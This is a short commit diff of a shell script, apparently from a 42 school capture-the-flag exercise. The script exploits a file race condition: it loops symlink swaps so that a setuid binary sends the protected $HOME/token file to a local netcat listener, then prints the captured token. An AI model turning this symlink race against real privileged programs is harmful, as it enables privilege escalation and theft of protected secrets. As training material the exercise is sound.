9e256b3cca5005dfd97171d9f5c9deda45fe94c9
bchanot <bchanot@student.42.fr>
2019-03-10 22:38:42 +0100

    fin level12 -- 10-03-2019 22h38

--- level10/Ressources/script.sh
+++ level10/Ressources/script.sh
@@ -1,13 +1,13 @@
 #!/bin/bash
 touch /tmp/temp
-(nc -lk 6969)&
+(nc -lk 6969 >> /tmp/token10)&
 pid1=$!
 (while true; do $HOME/level10 /tmp/temp2 127.0.0.1 &>/dev/null; done)&
 pid2=$!
 (while true; do ln -sf /tmp/temp /tmp/temp2; ln -sf $HOME/token /tmp/temp2; done)&
 pid3=$!
 sleep 1
-cat /tmp/token
+cat /tmp/token10
 echo ""
 echo "/\\ Enjoy ! found the token somewhere between banners /\\"
 kill $pid1&
